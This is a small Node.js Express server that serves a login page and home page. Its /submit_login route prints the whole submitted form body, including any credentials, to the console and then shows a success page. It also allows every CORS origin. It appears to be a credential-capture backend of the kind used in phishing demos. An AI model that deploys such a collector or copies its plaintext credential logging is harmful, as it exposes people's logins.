const express = require("express")
const dotenv = require("dotenv")
const bodyparser = require("body-parser")


dotenv.config()

app = express()
const port = 5000

// MIDDLEWARES FOR CORS AND REQ BODY PARSING
app.use(bodyparser.json());
app.use((req,res,next)=>{

    res.setHeader('Access-Control-Allow-Origin','*');
    res.setHeader('Access-Control-Allow-Headers',  
                                    'Accept,Content-Type,X-Requested-With,Origin,Authorization');
    res.setHeader('Access-Control-Allow-Methods','*');

    next()
})

app.get("/login" , (req,res)=>{
    var fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;

    console.log(fullUrl)


    return res.sendFile(__dirname + "/pages/login.html")
})

app.get("/",(req,res)=>{
    var fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;

    console.log(fullUrl)


    return res.sendFile(__dirname + "/pages/home.html")
})

app.post("/submit_login",(req,res)=>{

    var fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;

    console.log(fullUrl)

    console.log(req.body)
    return res.sendFile(__dirname + "/pages/success.html")
})

app.listen(port , ()=>{
    console.log(`[+]Server Started at ${port}`)
})
